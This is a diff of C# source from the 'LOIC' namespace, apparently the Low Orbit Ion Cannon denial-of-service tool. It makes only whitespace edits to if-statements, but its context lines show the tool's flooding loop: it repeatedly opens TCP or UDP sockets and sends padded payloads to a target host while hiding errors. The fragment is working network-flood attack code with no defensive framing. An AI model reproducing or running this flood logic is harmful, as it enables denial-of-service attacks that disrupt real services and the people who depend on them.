@@ -44,7 +44,7 @@ namespace LOIC
 				while (IsFlooding)
 				{
 					Socket socket = null;
-					if (Protocol == 1)
+					if(Protocol == 1)
 					{
 						socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 						socket.NoDelay = true;
@@ -60,12 +60,12 @@ namespace LOIC
 								FloodCount++;
 								buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : null) ));
 								socket.Send(buf);
-								if (Delay >= 0) System.Threading.Thread.Sleep(Delay+1);
+								if(Delay >= 0) System.Threading.Thread.Sleep(Delay+1);
 							}
 						}
 						catch { }
 					}
-					if (Protocol == 2)
+					if(Protocol == 2)
 					{
 						socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
 						socket.Blocking = Resp;
@@ -76,7 +76,7 @@ namespace LOIC
 								FloodCount++;
 								buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : null) ));
 								socket.SendTo(buf, SocketFlags.None, RHost);
-								if (Delay >= 0) System.Threading.Thread.Sleep(Delay+1);
+								if(Delay >= 0) System.Threading.Thread.Sleep(Delay+1);
 							}
 						}
 						catch { }
